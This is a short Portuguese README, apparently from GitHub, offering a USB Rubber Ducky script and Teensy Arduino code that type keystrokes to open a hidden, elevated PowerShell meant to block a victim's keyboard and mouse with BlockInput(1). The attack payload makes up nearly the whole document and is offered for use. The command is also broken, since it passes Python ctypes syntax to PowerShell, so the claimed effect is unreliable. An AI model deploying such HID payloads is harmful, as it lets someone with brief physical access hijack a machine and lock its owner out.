# Rubber Ducky Script para Bloquear Teclado e Mouse
## Script Ducky
<img src="https://camo.githubusercontent.com/d65e5e6cf259a084a5d6145b814b7e86d96841a2346f6b91cfb5eb65af6d05a6/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4d61726b646f776e2d3030303030303f7374796c653d666f722d7468652d6261646765266c6f676f3d6d61726b646f776e266c6f676f436f6c6f723d7768697465">

```ducky
DELAY 500
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "& {Start-Process PowerShell -ArgumentList 'ctypes.windll.user32.BlockInput(1)' -Verb RunAs}"
ENTER
```
### O que esse script faz?
- Abre o Executar (Windows + R)
- Executa o PowerShell em modo administrador
- Bloqueia o teclado e mouse via `BlockInput(1)`


## Código para Teensy 2.0 ou 3.2

```cpp
void setup() {
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    delay(500);
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    
    delay(500);
    Keyboard.print("powershell -WindowStyle Hidden -Command \"& {Start-Process PowerShell -ArgumentList 'ctypes.windll.user32.BlockInput(1)' -Verb RunAs}\"");
    delay(500);
    
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);
    Keyboard.set_key1(0);
    Keyboard.send_now();
}

void loop() {
}
```

### Créditos: Ivar Satierf

